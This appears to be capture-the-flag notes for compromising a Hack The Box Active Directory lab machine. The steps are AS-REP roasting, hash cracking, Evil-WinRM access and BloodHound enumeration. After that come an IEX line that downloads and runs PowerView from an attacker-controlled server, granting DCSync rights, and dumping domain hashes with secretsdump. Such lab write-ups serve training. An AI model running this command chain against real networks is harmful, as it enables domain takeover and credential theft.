```
GetNPUsers.py -format john -no-pass -k -usersfile users -dc-ip 10.10.10.161 HTB.LOCAL/ 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

###For this article, we will use BloodHound to map the whole environment. For that, we first will upload SharpHound to the victim machine.
```
<<Invoke-BloodHound -CollectionMethod All>>
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network>  copy //10.10.16.228/kali/enumeration/nmapAutomator/10.10.10.161/SharpHound.ps1 .
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> Invoke-BloodHound -CollectionMethod All*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> 
#Transfer file from linux host using a simple http server
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/PowerView.ps1')

#Run the following commands to add the user to the ACL list
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'pass123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\zarrius', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zarrius -Rights DCSync

#Back on linux run 
──(zarrius㉿zarrius)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 secretsdump.py zarrius:pass123@10.129.1.77

```

